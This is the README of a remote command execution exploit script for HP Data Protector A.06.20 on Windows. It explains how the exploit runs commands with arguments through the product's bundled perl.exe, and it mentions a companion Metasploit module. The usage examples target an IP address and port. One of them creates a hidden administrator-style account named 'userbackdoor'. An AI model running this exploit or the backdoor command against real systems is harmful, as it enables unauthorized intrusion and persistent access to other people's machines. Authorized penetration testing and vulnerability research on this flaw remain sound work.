# HP Data Protector Arbitrary Remote Command Execution
This script allows to execute a command with an arbitrary number of arguments. The trick is done by calling the **perl.exe** interpreter installed with HP Data Protector inside the directory ```{install_path}/bin/```

The existing exploits allows to execute a single command without parameters and this behaviour is unexceptable in most of the pentesting scenarious. The main feature of the script is to bypass that limitation allowing to execute a command with all the needed parameters.

# Target OS
* Microsoft Windows

# Tested Version
* HP Data Protector A.06.20

# Usage
```hp_data_protector_rce.py <target> <port> <command>```

# Example
```hp_data_protector_rce.py 192.168.1.1 5555 'dir c:\'```

```hp_data_protector_rce.py 192.168.1.1 5555 'ipconfig /all'```

```hp_data_protector_rce.py 192.168.1.1 5555 'net user userbackdoor pwdbackdoor /ADD'```

# Metasploit module
The exploit is also provided with a Metasploit module.

# Reference:
http://www.zerodayinitiative.com/advisories/ZDI-11-055/
